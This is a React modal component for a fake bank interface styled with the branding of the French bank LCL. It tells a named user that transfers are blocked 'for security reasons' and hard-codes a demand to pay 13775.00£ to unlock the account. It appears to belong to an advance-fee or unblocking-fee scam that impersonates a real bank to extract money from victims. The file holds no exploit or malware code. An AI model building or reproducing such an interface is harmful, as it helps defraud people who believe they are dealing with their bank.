import React from 'react';
import { AlertTriangle, X } from 'lucide-react';

const LCL_BLUE = '#1a237e';

export default function BlockedAccountModal({
  user,
  onClose
}) {
  if (!user) return null;

  return (
    <div
      className="fixed inset-0 backdrop-blur-sm flex items-center justify-center p-4 z-50"
      style={{ background: 'rgba(0,0,0,0.5)' }}
    >
      <div className="bg-white rounded-2xl max-w-md w-full shadow-2xl overflow-hidden">

        {/* EN-TÊTE */}
        <div
          className="p-5 border-b"
          style={{ background: LCL_BLUE }}
        >
          <div className="flex items-center justify-between">

            <div className="flex items-center gap-3">

              <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
                <AlertTriangle
                  className="text-white"
                  size={22}
                />
              </div>

              <h2 className="text-lg font-bold text-white">
                Virement impossible
              </h2>

            </div>

            <button
              onClick={onClose}
              className="text-white/70 hover:text-white transition"
            >
              <X size={22} />
            </button>

          </div>
        </div>

        {/* CONTENU */}
        <div className="p-6">

          <p className="text-gray-700 mb-4">
            Bonjour{' '}
            <span className="font-semibold">
              {user.name}
            </span>,
          </p>

          <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-5">

            <p className="text-sm text-red-800 font-semibold mb-2">
              Vous ne pouvez pas effectuer de virement.
            </p>

            <p className="text-sm text-red-700">
votre compte est actuellement bloqué pour des raisons de sécurité,veuillez vous acquiter de la somme de 13775.00£ pour débloquer votre compte et effectuer vos virements.            </p>

          </div>

          {/* MOTIF DU USER */}
          <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-5">

            <p className="text-xs text-amber-700 font-semibold mb-1">
              Motif du blocage
            </p>

            <p className="text-sm text-amber-900">
              {user.blockReason ||
                'Votre compte a été bloqué pour des raisons de sécurité.'}
            </p>

          </div>

          {/* STATUT */}
          <div className="bg-gray-50 rounded-xl p-4 mb-5 border border-gray-200">

            <div className="flex items-center justify-between">

              <span className="text-gray-700 font-medium text-sm">
                Statut du compte
              </span>

              <span className="flex items-center gap-2 text-sm font-semibold text-red-600">

                <span className="w-2.5 h-2.5 rounded-full bg-red-500" />

                Compte bloqué

              </span>

            </div>

          </div>

          {/* BOUTON */}
          <button
            onClick={onClose}
            className="w-full py-3 rounded-full font-semibold text-white transition hover:opacity-90"
            style={{ background: LCL_BLUE }}
          >
            Compris
          </button>

        </div>

      </div>
    </div>
  );
}